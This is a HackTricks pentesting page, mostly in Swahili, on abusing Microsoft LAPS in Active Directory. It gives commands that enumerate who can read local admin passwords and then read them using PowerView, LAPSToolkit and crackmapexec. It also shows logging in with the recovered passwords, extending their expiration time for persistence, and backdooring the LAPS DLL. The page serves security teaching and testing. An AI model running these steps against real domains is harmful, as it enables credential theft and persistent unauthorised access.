# LAPS

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}


## Basic Information

Local Administrator Password Solution (LAPS) ni chombo kinachotumika kwa usimamizi wa mfumo ambapo **nywila za msimamizi**, ambazo ni **za kipekee, zilizopangwa kwa nasibu, na hubadilishwa mara kwa mara**, zinatumika kwa kompyuta zilizounganishwa kwenye eneo. Nywila hizi zinahifadhiwa kwa usalama ndani ya Active Directory na zinapatikana tu kwa watumiaji ambao wamepewa ruhusa kupitia Orodha za Udhibiti wa Ufikiaji (ACLs). Usalama wa uhamasishaji wa nywila kutoka kwa mteja hadi seva unahakikishwa kwa kutumia **Kerberos toleo la 5** na **Kiwango cha Ulinzi wa Juu (AES)**.

Katika vitu vya kompyuta vya eneo, utekelezaji wa LAPS unapelekea kuongeza sifa mbili mpya: **`ms-mcs-AdmPwd`** na **`ms-mcs-AdmPwdExpirationTime`**. Sifa hizi zinahifadhi **nywila ya msimamizi ya maandiko** na **wakati wake wa kuisha**, mtawalia.

### Check if activated
```bash
reg query "HKLM\Software\Policies\Microsoft Services\AdmPwd" /v AdmPwdEnabled

dir "C:\Program Files\LAPS\CSE"
# Check if that folder exists and contains AdmPwd.dll

# Find GPOs that have "LAPS" or some other descriptive term in the name
Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# Search computer objects where the ms-Mcs-AdmPwdExpirationTime property is not null (any Domain User can read this property)
Get-DomainObject -SearchBase "LDAP://DC=sub,DC=domain,DC=local" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname
```
### LAPS Password Access

You could **download the raw LAPS policy** from `\\dc\SysVol\domain\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol` and then use **`Parse-PolFile`** from the [**GPRegistryPolicyParser**](https://github.com/PowerShell/GPRegistryPolicyParser) package can be used to convert this file into human-readable format.

Moreover, the **native LAPS PowerShell cmdlets** can be used if they're installed on a machine we have access to:
```powershell
Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS

# List who can read LAPS password of the given OU
Find-AdmPwdExtendedRights -Identity Workstations | fl

# Read the password
Get-AdmPwdPassword -ComputerName wkstn-2 | fl
```
**PowerView** inaweza pia kutumika kugundua **nani anaweza kusoma nenosiri na kulisoma**:
```powershell
# Find the principals that have ReadPropery on ms-Mcs-AdmPwd
Get-AdmPwdPassword -ComputerName wkstn-2 | fl

# Read the password
Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd
```
### LAPSToolkit

The [LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit) inarahisisha kuorodhesha LAPS hii kwa kutumia kazi kadhaa.\
Moja ni kuchambua **`ExtendedRights`** kwa **kompyuta zote zenye LAPS iliyoanzishwa.** Hii itaonyesha **makundi** yaliyotengwa mahsusi **kusoma nywila za LAPS**, ambayo mara nyingi ni watumiaji katika makundi yaliyolindwa.\
**Akaunti** ambayo ime **jiunga na kompyuta** kwenye kikoa inapokea `All Extended Rights` juu ya mwenyeji huo, na haki hii inampa **akaunti** uwezo wa **kusoma nywila.** Kuorodhesha kunaweza kuonyesha akaunti ya mtumiaji ambayo inaweza kusoma nywila ya LAPS kwenye mwenyeji. Hii inaweza kutusaidia **kulenga watumiaji maalum wa AD** ambao wanaweza kusoma nywila za LAPS.
```powershell
# Get groups that can read passwords
Find-LAPSDelegatedGroups

OrgUnit                                           Delegated Groups
-------                                           ----------------
OU=Servers,DC=DOMAIN_NAME,DC=LOCAL                DOMAIN_NAME\Domain Admins
OU=Workstations,DC=DOMAIN_NAME,DC=LOCAL           DOMAIN_NAME\LAPS Admin

# Checks the rights on each computer with LAPS enabled for any groups
# with read access and users with "All Extended Rights"
Find-AdmPwdExtendedRights
ComputerName                Identity                    Reason
------------                --------                    ------
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\Domain Admins   Delegated
MSQL01.DOMAIN_NAME.LOCAL    DOMAIN_NAME\LAPS Admins     Delegated

# Get computers with LAPS enabled, expirations time and the password (if you have access)
Get-LAPSComputers
ComputerName                Password       Expiration
------------                --------       ----------
DC01.DOMAIN_NAME.LOCAL      j&gR+A(s976Rf% 12/10/2022 13:24:41
```
## **Kutoa Nywila za LAPS Kwa Kutumia Crackmapexec**
Ikiwa hakuna ufikiaji wa powershell unaweza kutumia haki hii kwa mbali kupitia LDAP kwa kutumia
```
crackmapexec ldap 10.10.10.10 -u user -p password --kdcHost 10.10.10.10 -M laps
```
Hii itatoa nywila zote ambazo mtumiaji anaweza kusoma, ikikuruhusu kupata msingi bora na mtumiaji tofauti.

## ** Kutumia Nywila ya LAPS **
```
freerdp /v:192.168.1.1:3389  /u:Administrator
Password: 2Z@Ae)7!{9#Cq

python psexec.py Administrator@web.example.com
Password: 2Z@Ae)7!{9#Cq
```
## **LAPS Persistence**

### **Tarehe ya Kuisha**

Mara tu unapokuwa admin, inawezekana **kupata nywila** na **kuzuia** mashine isifanye **sasisho** la **nywila** kwa **kueka tarehe ya kuisha katika siku zijazo**.
```powershell
# Get expiration time
Get-DomainObject -Identity computer-21 -Properties ms-mcs-admpwdexpirationtime

# Change expiration time
## It's needed SYSTEM on the computer
Set-DomainObject -Identity wkstn-2 -Set @{"ms-mcs-admpwdexpirationtime"="232609935231523081"}
```
{% hint style="warning" %}
Nenosiri bado litarejeshwa ikiwa **admin** atatumia **`Reset-AdmPwdPassword`** cmdlet; au ikiwa **Usiruhusu muda wa kuisha kwa nenosiri kuwa mrefu zaidi ya inavyohitajika na sera** imewezeshwa katika LAPS GPO.
{% endhint %}

### Backdoor

Msimbo wa asili wa LAPS unaweza kupatikana [hapa](https://github.com/GreyCorbel/admpwd), kwa hivyo inawezekana kuweka backdoor katika msimbo (ndani ya `Get-AdmPwdPassword` njia katika `Main/AdmPwd.PS/Main.cs` kwa mfano) ambayo kwa namna fulani **itatoa nenosiri mpya au kuyahifadhi mahali fulani**.

Kisha, tu kompilisha `AdmPwd.PS.dll` mpya na uipakie kwenye mashine katika `C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll` (na ubadilishe muda wa mabadiliko).

## References
* [https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/](https://4sysops.com/archives/introduction-to-microsoft-laps-local-administrator-password-solution/)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
Jifunze & fanya mazoezi ya AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Jifunze & fanya mazoezi ya GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Angalia [**mpango wa usajili**](https://github.com/sponsors/carlospolop)!
* **Jiunge na** 💬 [**kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuatilie** kwenye **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu za hacking kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
